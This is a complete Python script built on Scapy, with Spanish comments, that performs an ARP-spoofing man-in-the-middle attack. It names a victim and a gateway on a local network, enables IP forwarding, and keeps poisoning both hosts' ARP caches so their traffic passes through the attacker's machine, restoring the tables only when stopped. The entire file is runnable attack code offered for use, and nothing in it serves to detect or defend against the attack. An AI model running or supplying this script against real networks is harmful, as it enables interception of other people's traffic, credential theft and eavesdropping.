#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from scapy.all import *
import time
import sys
import os

# ================= CONFIGURACIÓN =================

# IP de la víctima
victim_ip = "192.168.1.11"

# IP del gateway / router
gateway_ip = "192.168.1.1"

# Interfaz de red (None = automática)
iface = None   # ejemplo: "ens33"

# Intervalo entre paquetes ARP
interval = 2

# =================================================

def get_mac(ip):
    """Obtiene la MAC de una IP"""
    ans, _ = sr(ARP(pdst=ip), timeout=2, retry=3, verbose=False)
    for _, rcv in ans:
        return rcv.hwsrc
    return None


def arp_spoof(target_ip, target_mac, spoof_ip):
    """Envía paquete ARP falso"""
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(pkt, verbose=False)


def restore_arp(dest_ip, dest_mac, src_ip, src_mac):
    """Restaura la tabla ARP"""
    pkt = ARP(
        op=2,
        pdst=dest_ip,
        hwdst=dest_mac,
        psrc=src_ip,
        hwsrc=src_mac
    )
    send(pkt, count=5, verbose=False)


def enable_ip_forwarding():
    """Habilita reenvío IP"""
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def disable_ip_forwarding():
    """Deshabilita reenvío IP"""
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def mitm():
    print("[*] Iniciando ARP MitM")
    print(f"[*] Víctima: {victim_ip}")
    print(f"[*] Gateway: {gateway_ip}")
    print("[*] CTRL+C para detener\n")

    enable_ip_forwarding()

    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    if victim_mac is None or gateway_mac is None:
        print("[!] No se pudieron obtener las MAC")
        sys.exit(1)

    print(f"[+] MAC Víctima: {victim_mac}")
    print(f"[+] MAC Gateway: {gateway_mac}")

    try:
        while True:
            # Envenenar víctima
            arp_spoof(victim_ip, victim_mac, gateway_ip)

            # Envenenar gateway
            arp_spoof(gateway_ip, gateway_mac, victim_ip)

            time.sleep(interval)

    except KeyboardInterrupt:
        print("\n[!] Deteniendo ataque y restaurando ARP...")
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
        restore_arp(gateway_ip, gateway_mac, victim_ip, victim_mac)
        disable_ip_forwarding()
        print("[+] Red restaurada. Saliendo.")
        sys.exit(0)


if __name__ == "__main__":
    mitm()
